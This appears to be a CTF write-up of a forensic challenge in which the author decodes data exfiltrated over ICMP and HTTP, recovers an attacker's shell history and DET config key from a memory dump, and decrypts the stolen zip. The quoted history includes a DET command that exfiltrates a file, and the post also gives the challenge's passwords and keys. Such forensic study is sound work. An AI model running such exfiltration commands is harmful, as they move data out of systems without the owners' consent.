---
title: "Mission impossible 2"
date: 2018-12-20
categories:
- write-ups
- santhacklausctf
tags:
- forensic
- network
- crypto
keywords:
- forensic
- network
- crypto
coverImage: /images/mi2/bg.png
coverSize: full
coverMeta: in
metaAlignment: center
autoThumbnailImage: false
summary : "Write-up about the challenge mission impossible 2 from the santhacklaus CTF."
---

|  Event | Challenge | Category | Points | Solves |
|:----------:|:------------:|:------------:|:------------:|:------------:|
| santhacklausctf |  mi2  |  Forensic/Crypto/network  | 500 |  22  |


# TL;DR

In the second part of the challenge we also had a memory dump of a Debian system and a network capture. When you analyse the network capture you can see that some data were exfiltrated, if you look into the memdup you can see that the tool [DET](https://github.com/sensepost/DET) (Data Exfiltration Toolkit), has been used to exfiltrate the data. You can also recover the encryption key for the data and a zip file which contain the flag. 


# Introduction

Actually I solved this challenge before [mi1](http://localhost:1313/2018/12/mission-impossible-1/) and I only used {{< hl-text orange >}}strings{{< /hl-text >}} to analyse the memory dump because I wasn't aware of linux profile for volatility. 

I started by analysing the {{< hl-text orange >}}challenge.pcapng{{< /hl-text >}}, I quickly saw some weird data in the ICMP and in the HTTP packets. It look like base64 encoding. I coded a little script in python to extract everything. 

{{< image classes="fancybox fig-100" src="/images/mi2/icmp.png" thumbnail="/images/mi2/icmp.png" >}}

</br>

{{< image classes="fancybox fig-100" src="/images/mi2/post.png" thumbnail="/images/mi2/post.png" >}}

{{< codeblock lang="python"  >}}
#!/usr/bin/python3

import pyshark
import base64

FILE = "./challenge.pcapng"

def getData(pkt):
    try:
        if pkt['URLENCODED-FORM']:
            return handleHttp(pkt)

    except Exception:
        pass

    try:
        if pkt['ICMP']:
            return handleICMP(pkt)

    except Exception as e:
        #print(pkt)
        return None

def handleHttp(pkt):
    #print (pkt)
    raw = pkt['URLENCODED-FORM']
    return base64.b64decode(raw.value)

def handleICMP(pkt):
    raw = pkt['ICMP']
    b64 = bytes.fromhex(raw.data).decode('utf-8')
    return base64.b64decode(b64)


pkts = pyshark.FileCapture(FILE)

for pkt in pkts:
    if pkt['ip'].src == "192.168.0.26":

        data = getData(pkt)
        if data != None:
            print (data)


{{< /codeblock >}}

When we run the script we get something like this :

```
b'z6f9HaX|!|flag.zip|!|REGISTER|!|3682490664d5bf7905397710edb84737'
[...]
b'z6f9HaX|!|72|!|2363668a94e3da3f34f7686d4dd3ea86505fefe92d42e88fcfde89bea382d982476c0f44e65b894091725439a2df35b69bdb865e8d6fae119aa481273f19a2340aed08ba71997e1363f215837559276bbec9eb77bc1722a18f433e51bcbc5bc77898eadc86a7eab266cef5d345d58268e2d35d1775d2c58712f7637e4d6b138dd45b94f514d376c2c7c905f82e0247974553c307b5bc93862d646e9dcdc2ee6e640b458685d35d7782ee40b435d84cd1724cada58c488ec2fbb823933df97a194c046c0ca65c52a4f7f39e85496413f57464299a37eca32a992e29715ccb05a87c06c17f98a2d8ffa8206c11bd322cce9c3dd1f7f2725be2f19e1936d5ebe7cbf9063f0692bc1bb24c01d518e9d23b06a9b10270856ef38ddab12f598ce6fea4c1d114873e0e7e64ae697789e14133e9528667ba'
b'z6f9HaX|!|73|!|7a7c9bd3087fd44bf22ca7166bb9d3a8c9e720149d4accced33349e1ba5e64f8d71247551904fc6fc0d97f3dfcd153517ff0868216ee2f70c67bb272246022263c8ccba649a8e1b75f59c629a245d6a23bcf4d98a362ca4ad3c7f5d89dddd3fcc3274a9df2c8b23acd88a6674284a3caa56d490c06f699e3a9756694ea56ccce24ecfb3b948772741ef42f76cbc5142808696ea0c5c278f48b4cd8cd8fdd81a23b2c075a6e6a5776a08f7b6115494b20805abecbea32b23d7d224f90d361fc770bc07b8e7a265a'
b'z6f9HaX|!|74|!|DONE'
```

The file {{< hl-text orange >}}flag.zip{{< /hl-text >}} seems to be what we are looking for. I tried to look at the hexadecimal data in each packet but no trace of a zip file signature. It's time to look at the memorydump.

# Digging into the memdump

I used *strings* with *grep* and the *A/B* option of grep which print some line after/before what you are looking for. 

```
$ strings challenge.raw | grep -A 5 -B 5 flag.zip
[...]
sudo git clone https://github.com/sensepost/DET
[...]
    5  ls -alh
    6  sudo chown -R evil-hacker:evil-hacker /opt/DET/
    7  cp config-sample.json config.json 
    8  nano config.json 
    9  cp -v /media/evil-hacker/DISK_IMG/FOR05/flag.jpg .
   10  zip flag.zip flag.jpg -P {{< hl-text orange >}}IMTLD{N0t_Th3_Fl4g}{{< /hl-text >}}
   11  rm flag.jpg 
   12  sudo python det.py -c config.json -p icmp,http -f flag.zip 
   13  rm flag.zip 
   14  history
[...]
```

Our {{< hl-text orange >}}evil-hacker{{< /hl-text >}} used the script det.py tho exfiltrate the encrypted file flag.zip. If we look into the github repository we can learn more about this tool.

# Det.py

{{< blockquote >}}
DET (is provided AS IS), is a proof of concept to perform Data Exfiltration using either single or multiple channel(s) at the same time.
{{< /blockquote >}}

{{< blockquote >}}
In order to use DET, you will need to configure it and add your proper settings (eg. SMTP/IMAP, AES256 encryption passphrase and so on). A configuration example file has been provided and is called: config-sample.json
{{< /blockquote >}}

Inside the script there is this interesting part :

{{< codeblock lang="python"  >}}
# sending the data
f = tempfile.SpooledTemporaryFile()
e = open(self.file_to_send, 'rb')
data = e.read()
if COMPRESSION:
    data = compress(data)
f.write(aes_encrypt(data, self.exfiltrate.KEY))
f.seek(0)
e.close()   

{{< /codeblock >}}

The exfiltrated file is first compress and then encrypted with a key which is located inside the file {{< hl-text orange >}}config.json{{< /hl-text >}}. The default key can be found on the github repository.


{{< codeblock lang="json"  >}}
[...]
"AES_KEY": "THISISACRAZYKEY",
"max_time_sleep": 10,
"min_time_sleep": 1,
"max_bytes_read": 400,
"min_bytes_read": 300,
"compression": 1

{{< /codeblock >}}

Obviously the encryption key was modified for the CTF. We need that key to recover the zip file.

```json
$ strings challenge.raw | grep -A 5 -B 5 AES_KEY
[...]
"AES_KEY": "{{< hl-text orange >}}IMTLD{This_is_just_a_key_not_the_flag}{{< /hl-text >}}",
"max_time_sleep": 10,
"min_time_sleep": 1,
"max_bytes_read": 400,
"min_bytes_read": 300,
"compression": 1
[...]
```

# The flag

Now we have everything we just need a script to get our flag. I used the {{< hl-text orange >}}aes_decrypt{{< /hl-text >}} function of det.py and modify some parts for *python3*

{{< codeblock lang="python"  >}}
#!/usr/bin/python3

import hashlib
from zlib import decompress
from Crypto.Cipher import AES

def aes_decrypt(message, key=KEY):
    try:
        # Retrieve CBC IV
        iv = message[:AES.block_size]
        message = message[AES.block_size:]

        # Derive AES key from passphrase
        aes = AES.new(hashlib.sha256(key.encode('utf-8')).digest(), AES.MODE_CBC, iv)
        message = aes.decrypt(message)

        # Remove PKCS5 padding
        unpad = lambda s: s[:-ord(s[len(s) - 1:])]

        return unpad(message)
    except Exception as e:
        print(e)
        return None


pkts = pyshark.FileCapture(FILE)
print("[info] Starting")
for pkt in pkts:
    if pkt['ip'].src == "192.168.0.26":

        data = getData(pkt)
        if data != None:
            data = parseData(data)
            if data != None:
                RET += data

data = bytes.fromhex(RET)
print("[info] Decryption")
decrypted = aes_decrypt(data,KEY)

zip = open('flag.zip','wb')
zip.write(decompress(decrypted))

zip.close()
print("[info] Done")

{{< /codeblock >}}


{{< codeblock lang="bash"  >}}
$ ./mi2.py
[info] Starting
[info] Decryption
[info] Done
$ unzip -P IMTLD{N0t_Th3_Fl4g} flag.zip 
Archive:  flag.zip
  inflating: flag.jpg

{{< /codeblock >}}

And we have our flag :

{{< image classes="fancybox fig-100" src="/images/mi2/flag.png" thumbnail="/images/mi2/flag.png" >}}


